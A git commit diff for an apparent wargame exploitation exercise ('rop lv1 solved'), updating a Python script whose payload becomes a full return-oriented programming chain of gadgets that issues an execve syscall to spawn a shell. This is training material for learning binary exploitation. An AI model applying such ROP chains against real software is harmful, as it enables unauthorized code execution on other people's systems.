a7ec3db56c976c833b3c6a1a4af7cc9e9c9d1285
Anshul Singh <anshulspidy@gmail.com>
2025-06-25 20:04:45 +0200

    rop lv1 solved

--- ret2wargames/rop/06_lv1.py
+++ ret2wargames/rop/06_lv1.py
@@ -15,11 +15,14 @@ print(p.readuntil('guess:'))
 buffer_start = 0x7fffffffed40 # rbp-0x40
 libc_base = 0x7f000042c000
 pop_rdi = p64(0x0000000000400e93)
+pop_rax = p64(libc_base + 0x0000000000033544)
+pop_rsi = p64(libc_base + 0x00000000000202e8)
+pop_rdx = p64(libc_base + 0x0000000000001b92)
 add_rsp_0x8 = p64(0x0000000000400722)
-system = p64(0x7f0000471390)
+syscall = p64(libc_base + 0x00000000000bc375)
 sh = p64(0x7f00005b8d57)
 
-payload = "rop chain" + "\0"*11 + "A"*52 + "\x22\x07\x40\x00" + "rop chain" + "\0"*7 + pop_rdi #+ sh + system
+payload = sh + "\0"*11 + "A"*45 + pop_rdi + pop_rdi + sh + pop_rax + p64(0x3b) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall
 
 p.sendline(payload)
 
